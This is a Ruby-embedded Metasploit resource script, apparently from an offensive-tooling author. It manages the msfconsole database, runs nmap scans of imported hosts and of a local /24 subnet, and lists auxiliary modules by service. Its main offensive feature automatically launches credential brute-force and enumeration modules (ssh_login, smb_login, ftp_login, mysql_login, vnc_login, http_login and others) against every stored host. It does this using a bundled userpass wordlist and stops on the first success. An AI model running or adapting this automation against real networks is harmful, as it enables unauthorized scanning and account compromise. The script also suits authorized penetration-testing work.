<ruby>
   help = %Q|

    Description:
      This Metasploit RC file can be used to manage msfconsole database tasks:
      Display database data, record msfconsole activity, add hosts to database,
      import files.xml import list of hosts contained on a text file (one-per-line-entries)
      auto_brute-force db hosts by service name, auto_search compatible auxiliarys modules
      based on db hosts service names input and clean all database data at script exit.
      'Execute this script without any args (setg) to display script options available'


    Execute in msfconsole:
      resource <path-to-script>/manage_db.rc

    Author:
      r00t-3xp10it  <pedroubuntu10[at]gmail.com>
    |
    print_line(help)
    Rex::sleep(2.0)
    print_line("")


    ## Make sure we are connected to db
    unless framework.db.active
      print_error("Database not connected to postgresql.")
      print_warning("[execute] service postgresql start")
      run_single("exit")
      return nil
    else
      print_good("Database connected to postgresql.")
      Rex::sleep(1.0)
    end

    ## Record msfconsole activity
    if (framework.datastore['RECORD'] == "true")
       run_single("spool #{local}/logs/database.log")
       Rex::sleep(1.0)
    end

    ## Adds manually hosts to database and scan them with db_nmap
    unless (framework.datastore['DBHOST'] == nil or framework.datastore['DBHOST'] == '')
       print_line("")
       print_line("Hosts to import")
       print_line("=======================")
       run_single("hosts -a #{framework.datastore['DBHOST']}")
       print_status("Scanning new targets (db_nmap)")
       Rex::sleep(1.0)
       run_single("db_nmap -sV -v -Pn -T4 -n -O --open #{framework.datastore['DBHOST']}")
       Rex::sleep(1.0)
    end

    ## Import to current database a text list of hosts (one-per-line-entries)
    unless (framework.datastore['TXT_IMPORT'] == nil or framework.datastore['TXT_IMPORT'] == '')
       check_import = "#{framework.datastore['TXT_IMPORT']}"
       ## Make sure that file to import exists
       unless (File.exist?(check_import))
          print_error("[ERROR] File to be imported not found.")
          print_error("[ERROR] #{check_import}")
          run_single("unsetg all")
          return nil
       end
       ## Read contents of file to import, parse data and start msf portscanner
       import_txt = File.read(check_import)
          parse_data = import_txt.split(' ').join(' ')
          print_line("")
          print_line("List of hosts to import")
          print_line("=======================")
          run_single("hosts -a #{parse_data}")
          Rex::sleep(1.5)
          print_status("Scanning new targets (db_nmap)")
          Rex::sleep(1.0)
          run_single("db_nmap -sV -v -Pn -T4 -n -O --open #{parse_data}")
          Rex::sleep(2.5)
    end


    ## Import to database one xml file (nmap, wireshark or metasploit supported)
    unless (framework.datastore['XML_IMPORT'] == nil or framework.datastore['XML_IMPORT'] == '')
       xml_file = "#{framework.datastore['XML_IMPORT']}"
       print_status("Import xml: #{xml_file}")
       ## Make sure that the file to import exists
       unless (File.exist?(xml_file))
          print_error("[ERROR] Script can not find the path inputed.")
          print_error("[ERROR] #{xml_file}")
          run_single("unsetg all")
          return nil
       end
       run_single("db_import #{framework.datastore['XML_IMPORT']}")
       Rex::sleep(1.0)
    end



    if (framework.datastore['LOCAL_SCAN'] == "true")
       print_warning("Scanning local lan for alive hosts (21:22:23:80:110:445:3306)")
       run_single("db_nmap -sV -v -Pn -T4 -n -p 21,22,23,80,110,445,3306 --open 192.168.1.0/24")
    end


    ## Read current database and declare local vars
    run_single("workspace -v")
    Rex::sleep(1.0)
    xhost = framework.db.hosts.map(&:address).join(' ')
    xport = framework.db.services.map(&:port).join(' ')
    proto = framework.db.services.map(&:name).join(' ')
    ## Do not display the next table IF database does not contain any hosts
    unless xhost.nil? or xhost == '' or xhost == ' '
       run_single("hosts -c address,os_name,os_flavor,vulns")
       print_line("")
       Rex::sleep(1.0)
       run_single("services -c port,proto,name,state -u")
       print_line("")
       Rex::sleep(1.0)
    end


    print_line("")
    ## Scan current database hosts with nmap framework
    if (framework.datastore['DB_SCAN'] == "true")
       print_warning("Scanning database hosts with nmap.")
       unless xhost.nil? or xhost == '' or xhost == ' '
          print_status("RHOSTS: #{xhost}")
          ## setting speend of scan based on nÂº of hosts
          len = xhost.length()
          if xhost.length() > 200
               print_status("LENGTH: #{len} => -T5 (scan speed)")
               run_single("db_nmap -sV -v -Pn -T5 -n --open #{xhost}")
          else
               print_status("LENGTH: #{len} => -T4 (scan speed)")
               run_single("db_nmap -sV -v -Pn -T4 -n -O --open #{xhost}")
          end
          print_line("")
          run_single("hosts -c address,name,os_name,purpose")
          print_line("")
          run_single("services -c port,proto,name,state -u")
          print_line("")
          Rex::sleep(1.0)
       else
          print_error("[ERROR] None hosts found in current database.")
          Rex::sleep(2.0)
          run_single("unsetg all")
          return nil
       end
    end


    ## Displays auxiliary modules based on db service names
    if (framework.datastore['DB_AUX'] == "true")
    print_line("   Sellect auxiliary modules based on db service names:")
    print_line("   ----------------------------------------------------")
    Rex::sleep(1.5)
       ## List of service names supported by this function
       unless proto =~ /ftp/i or proto =~ /ssh/i or proto =~ /telnet/i or proto =~ /smb/i or proto =~ /netbios/i or proto =~ /msrcp/i or proto =~ /pop3/i or proto =~ /mssql/i or proto =~ /mysql/i or proto =~ /http/i or proto =~ /smtp/i or proto =~ /imap/i or proto =~ /postgresql/i or proto =~ /postgres/i or proto =~ /vnc/i
          print_error("[ERROR] None services names found in current database.")
          print_line("   ----------------------------------------------------")
          Rex::sleep(2.0)
          run_single("unsetg all")
          return nil
       end
       if proto =~ /ftp/i
          run_single("grep -m 5 scanner search name:ftp type:auxiliary")
       end
       if proto =~ /ssh/i
            run_single("grep -m 5 scanner search name:ssh type:auxiliary")
       end
       if proto =~ /telnet/i
            run_single("grep -m 5 scanner search name:telnet type:auxiliary")
       end
       if proto =~ /smb/i or proto =~ /netbios/i or proto =~ /msrpc/i
            run_single("grep -m 5 scanner search name:smb type:auxiliary")
       end
       if proto =~ /pop3/i
            run_single("grep -m 5 scanner search name:pop3 type:auxiliary")
       end
       if proto =~ /ms-sql-s/i or proto =~ /mssql/i or proto =~ /mssql-m/i
            run_single("grep -m 5 scanner search name:mssql type:auxiliary")
       end
       if proto =~ /mysql/i
            run_single("grep -m 5 scanner search name:mysql type:auxiliary")
       end
       if proto =~ /http/i
            run_single("grep -m 5 scanner search name:http type:auxiliary")
       end
       if proto =~ /smtp/i
            run_single("grep -m 5 scanner search name:smtp type:auxiliary")
       end
       if proto =~ /imap/i
            run_single("grep -m 5 scanner search name:imap type:auxiliary")
       end
       if proto =~ /postgresql/i
            run_single("grep -m 5 scanner search name:postgresql type:auxiliary")
       end
       if proto =~ /vnc/i
            run_single("grep -m 5 scanner search name:vnc type:auxiliary")
       end
    print_line("   ----------------------------------------------------")
    print_line("")
    end


    ## Brute force database hosts based on service names
    unless (framework.datastore['DB_BRUTE'] == nil or framework.datastore['DB_BRUTE'] == '')
       xport = framework.db.services.map(&:port).join(' ')
       proto = framework.db.services.map(&:name).join(' ')
       ## Make sure the protocol sellected exists
       unless proto =~ /#{framework.datastore['DB_BRUTE']}/i
            print_error("[ERROR] Service [#{framework.datastore['DB_BRUTE']}] not found in database.")
            Rex::sleep(2.5)
            run_single("unsetg all")
            return nil
       end
       ## List of service names supported by this function
       unless (framework.datastore['DB_BRUTE'] == "ftp" or framework.datastore['DB_BRUTE'] == "ssh" or framework.datastore['DB_BRUTE'] == "telnet" or framework.datastore['DB_BRUTE'] == "smb" or framework.datastore['DB_BRUTE'] == "netbios" or framework.datastore['DB_BRUTE'] == "msrpc" or framework.datastore['DB_BRUTE'] == "pop3" or framework.datastore['DB_BRUTE'] == "mssql" or framework.datastore['DB_BRUTE'] == "mysql" or framework.datastore['DB_BRUTE'] == "http" or framework.datastore['DB_BRUTE'] == "postgresql" or framework.datastore['DB_BRUTE'] == "postgres" or framework.datastore['DB_BRUTE'] == "vnc")
          print_error("[ERROR] This option does not accept [#{framework.datastore['DB_BRUTE']}] service names.")
          print_warning("Service names supported: ftp|ssh|telnet|smb|netbios|msrpc|pop3|mssql|mysql|postgresql|postgres|vnc|http")
          Rex::sleep(2.0)
          run_single("unsetg all")
          return nil
       end
       ## Start brute force based on current database hosts service names
       run_single("setg USERPASS_FILE /usr/share/metasploit-framework/data/wordlists/piata_ssh_userpass.txt")
         if xport =~ /21/i or proto =~ /ftp/i
           if (framework.datastore['DB_BRUTE'] == "ftp")
              print_warning("Remote Target port: 21 ftp found")
              Rex::sleep(1.0)
              run_single("use auxiliary/scanner/ftp/ftp_version")
              run_single("set FTPPASS ReadTeam")
              run_single("set THREADS 16")
              run_single("services -c name -S ftp -u -R")
              run_single("exploit")
              run_single("use auxiliary/scanner/ftp/anonymous")
              run_single("set FTPPASS ReadTeam")
              run_single("set THREADS 16")
              run_single("services -c name -S ftp -u -R")
              run_single("exploit")
              run_single("use auxiliary/scanner/ftp/ftp_login")
              run_single("set STOP_ON_SUCCESS true")
              run_single("set BRUTEFORCE_SPEED 4")
              run_single("set THREADS 16")
              run_single("services -c name -S ftp -u -R")
              run_single("exploit")
           end
         end

         if xport =~ /22/i or proto =~ /ssh/i
           if (framework.datastore['DB_BRUTE'] == "ssh")
              print_warning("Remote Target port: 22 ssh found")
              Rex::sleep(1.0)
              run_single("use auxiliary/scanner/ssh/ssh_login")
              run_single("set STOP_ON_SUCCESS true")
              run_single("set VERBOSE true")
              run_single("set THREADS 13")
              run_single("services -c name -S ssh -u -R")
              run_single("exploit")
           end
         end

         if xport =~ /23/i or proto =~ /telnet/i
           if (framework.datastore['DB_BRUTE'] == "telnet")
              print_warning("Remote Target port: 23 telnet found")
              Rex::sleep(1.0)
              run_single("use auxiliary/scanner/telnet/telnet_version")
              run_single("services -c name -S telnet -R")
              run_single("exploit")
              run_single("use auxiliary/scanner/telnet/telnet_login")
              run_single("set STOP_ON_SUCCESS true")
              run_single("set THREADS 16")
              run_single("services -c name -S telnet -R")
              run_single("exploit")
           end
         end

         if xport =~ /110/i or proto =~ /pop3/i
           if (framework.datastore['DB_BRUTE'] == "pop3")
              print_warning("Remote Target port: 110 pop3 found")
              Rex::sleep(1.0)
              run_single("use auxiliary/scanner/pop3/pop3_version")
              run_single("set THREADS 20")
              run_single("services -c name -S pop3 -u -R")
              run_single("exploit")
              run_single("use auxiliary/scanner/pop3/pop3_login")
              run_single("set STOP_ON_SUCCESS true")
              run_single("set BRUTEFORCE_SPEED 4")
              run_single("unset USER_FILE")
              run_single("unset PASS_FILE")
              run_single("set THREADS 10")
              run_single("services -c name -S pop3 -u -R")
              run_single("exploit")
           end
         end

         if xport =~ /445/i or proto =~ /smb/i or proto =~ /netbios/i or proto =~ /msrpc/i
           if (framework.datastore['DB_BRUTE'] == "smb")
              print_warning("Remote Target port: 445 smb found")
              Rex::sleep(1.0)
              run_single("use auxiliary/scanner/smb/smb_version")
              run_single("set THREADS 16")
              run_single("services -c name -S smb -u -R")
              run_single("exploit")
              run_single("use auxiliary/scanner/smb/smb_lookupsid")
              run_single("set THREADS 16")
              run_single("services -c name -S smb -u -R")
              run_single("exploit")
              run_single("use auxiliary/scanner/smb/smb_enumusers")
              run_single("set THREADS 16")
              run_single("services -c name -S smb -u -R")
              run_single("exploit")
              run_single("use auxiliary/scanner/smb/smb_enumshares")
              run_single("set THREADS 16")
              run_single("services -c name -S smb -u -R")
              run_single("exploit")
              run_single("use auxiliary/scanner/smb/smb_login")
              run_single("set STOP_ON_SUCCESS true")
              run_single("unset USER_FILE")
              run_single("unset PASS_FILE")
              run_single("set THREADS 10")
              run_single("services -c name -S smb -u -R")
              run_single("exploit")
           end
         end

         if xport =~ /3306/i or proto =~ /mysql/i
           if (framework.datastore['DB_BRUTE'] == "mysql")
              print_warning("Remote Target port 3306 mysql found.")
              Rex::sleep(1.0)
              run_single("use auxiliary/scanner/mysql/mysql_version")
              run_single("set THREADS 16")
              run_single("services -c name -S mysql -u -R")
              run_single("exploit")
              Rex::sleep(1.5)
              run_single("use auxiliary/scanner/mysql/mysql_login")
              run_single("set STOP_ON_SUCCESS true")
              run_single("set VERBOSE true")
              run_single("set THREADS 25")
              run_single("services -c name -S mysql -u -R")
              run_single("exploit")
              Rex::sleep(1.5)
           end
         end

         if xport =~ /1433/i or proto =~ /mssql/i
           if (framework.datastore['DB_BRUTE'] == "mssql")
              print_warning("Remote Target port 1433 mssql found")
              Rex::sleep(1.0)
              run_single("use auxiliary/scanner/mssql/mssql_ping")
              run_single("set THREADS 5")
              run_single("services -c name -S mssql -R")
              run_single("exploit")
              run_single("use auxiliary/scanner/mssql/mssql_login")
              run_single("set STOP_ON_SUCCESS true")
              run_single("set VERBOSE true")
              run_single("set THREADS 16")
              run_single("services -c name -S mssql -R")
              run_single("exploit")
           end
         end

         if xport =~ /5432/i or proto =~ /postgresql/i or proto =~ /postgres/i
           if (framework.datastore['DB_BRUTE'] == "postgresql" or framework.datastore['DB_BRUTE'] == "postgres")
              print_warning("Remote Target port 5432 postgresql found")
              Rex::sleep(1.0)
              run_single("use auxiliary/scanner/postgres/postgres_version")
              run_single("set VERBOSE true")
              run_single("set THREADS 10")
              run_single("services -c name -S postgresql -S postgres -R")
              run_single("exploit")
              run_single("use auxiliary/scanner/postgres/postgres_login")
              run_single("set STOP_ON_SUCCESS true")
              run_single("set THREADS 20")
              run_single("services -c name -S postgresql -S postgres -R")
              run_single("exploit")
           end
         end

         if xport =~ /5900/i or proto =~ /vnc/i
           if (framework.datastore['DB_BRUTE'] == "vnc")
              print_warning("Remote Target port 5900 vnc found")
              Rex::sleep(1.0)
              run_single("use auxiliary/scanner/vnc/vnc_none_auth")
              run_single("set THREADS 10")
              run_single("services -c name -S vnc -R")
              run_single("exploit")
              run_single("use auxiliary/scanner/vnc/vnc_login")
              run_single("set STOP_ON_SUCCESS true")
              run_single("set THREADS 16")
              run_single("services -c name -S vnc -R")
              run_single("exploit")
           end
         end

         if xport =~ /80/i or proto =~ /http/i
           if (framework.datastore['DB_BRUTE'] == "http")
              print_warning("Remote Target port: 80 http found")
              Rex::sleep(1.0)
              run_single("use auxiliary/scanner/http/title")
              run_single("set THREADS 16")
              run_single("services -c name -S http -u -R")
              run_single("exploit")
              run_single("use auxiliary/scanner/http/options")
              run_single("set THREADS 8")
              run_single("services -c name -S http -u -R")
              run_single("exploit")
              run_single("use auxiliary/scanner/http/dir_scanner")
              run_single("set THREADS 30")
              run_single("services -c name -S http -u -R")
              run_single("exploit")
              run_single("use auxiliary/scanner/http/http_login")
              run_single("set STOP_ON_SUCCESS true")
              run_single("unset USER_FILE")
              run_single("unset PASS_FILE")
              run_single("set VERBOSE true")
              run_single("set THREADS 32")
              run_single("services -c name -S http -u -R")
              run_single("exploit")
           end
         end
    end


    ## Export list of services/hosts to one csv file (eg: ssh_hosts.CSV)
    unless (framework.datastore['CSV_EXPORT'] == nil or framework.datastore['CSV_EXPORT'] == '')
       xport = framework.db.services.map(&:port).join(' ')
       proto = framework.db.services.map(&:name).join(' ')
       ## Make sure the protocol sellected exists
       unless proto =~ /#{framework.datastore['CSV_EXPORT']}/i
            print_error("[ERROR] Service name [#{framework.datastore['CSV_EXPORT']}] not found in database.")
            Rex::sleep(2.5)
            run_single("unsetg all")
            return nil
       end
       print_warning("Exporting hosts with service #{framework.datastore['CSV_EXPORT']}")
       print_line("")
       run_single("services -c port,proto,name -S #{framework.datastore['CSV_EXPORT']}")
       print_line("")
       Rex::sleep(1.0)
       run_single("services -c port,name -S #{framework.datastore['CSV_EXPORT']} -o #{framework.datastore['CSV_EXPORT']}_hosts.CSV")
    end


    ## Execute another script.rc before manage_db.rc ends execution
    unless (framework.datastore['RUN_RC'] == nil or framework.datastore['RUN_RC'] == '')
       exec_rc = "#{framework.datastore['RUN_RC']}"
       unless (File.exist?(exec_rc))
          print_error("[ERROR] resource script to execute not found.")
          print_warning("[SCRIPT] #{exec_rc}")
          run_single("unsetg all")
          return nil
       end
       print_warning("Executing 'another' script inside manage_db.rc tasks.")
       if (framework.datastore['RANDOM_HOSTS'] == "true")
          run_single("resource #{framework.datastore['RUN_RC']}")
       else
          ## If random_hosts != nil then set rhosts global var
          unless xhost.nil? or xhost == '' or xhost == ' '
             if framework.datastore['RUN_RC'] =~ /handler.rc/i
                run_single("resource #{framework.datastore['RUN_RC']}")
             else
                run_single("setg RHOSTS #{xhost}")
                run_single("resource #{framework.datastore['RUN_RC']}")
             end
          else
             run_single("resource #{framework.datastore['RUN_RC']}")
          end
       end
    end


    ## Export all database data to database.xml local file 
    if (framework.datastore['XML_EXPORT'] == "true")
       xhost = framework.db.hosts.map(&:address).join(' ')
       unless xhost.nil? or xhost == '' or xhost == ' '
          print_warning("Exporting database to: database.xml")
          Rex::sleep(1.5)
          run_single("db_export -f xml database.xml")
       else
          print_error("[ERROR] None data present in current db to be exported.")
          Rex::sleep(1.0)
          run_single("unsetg all")
          return nil
       end
    end


    ## Cleaning global vars or all database
    print_warning("Cleaning global variables.")
    Rex::sleep(1.5)
    if (framework.datastore['CLEAN'] == "true")
       run_single("unsetg all")
       run_single("unset all")
       print_warning("Cleaning current database.")
       Rex::sleep(1.5)
       run_single("hosts -d")
       run_single("services -d")
       print_line("")
    else
       run_single("unsetg all")
       run_single("unset all")
       print_line("")
    end


    ## resource file main menu
    print_line("")
    print_line("Resource Commands              Description")
    print_line("-----------------              -----------")
    print_line("setg CLEAN true                Clean database at exit")
    print_line("setg RECORD true               Record msfconsole activity")
    print_line("setg DBHOST 10.10.10.3         Asign RHOSTS manually to database")
    print_line("setg DB_SCAN true              Auto-Scan database hosts with nmap")
    print_line("setg LOCAL_SCAN true           nmap scan local lan for alive hosts")
    print_line("setg XML_IMPORT /root/dic.xml  Import database.xml file to database")
    print_line("setg TXT_IMPORT /root/dic.txt  Import text hosts list (one-per-line)")
    print_line("setg XML_EXPORT true           Export contents of db to database.xml")
    print_line("setg CSV_EXPORT http           Export list of hosts based in service name")
    print_line("setg DB_BRUTE smb              Auto-Exploit db hosts based on service name")
    print_line("setg DB_AUX true               Auto-search auxiliarys based on db service names")
    print_line("setg RUN_RC /root/script.rc    Execute script.rc before manage_db.rc ends execution")
    print_line("resource /root/manage_db.rc    Execute this resource script")
    print_line("")
    run_single("back")

</ruby>
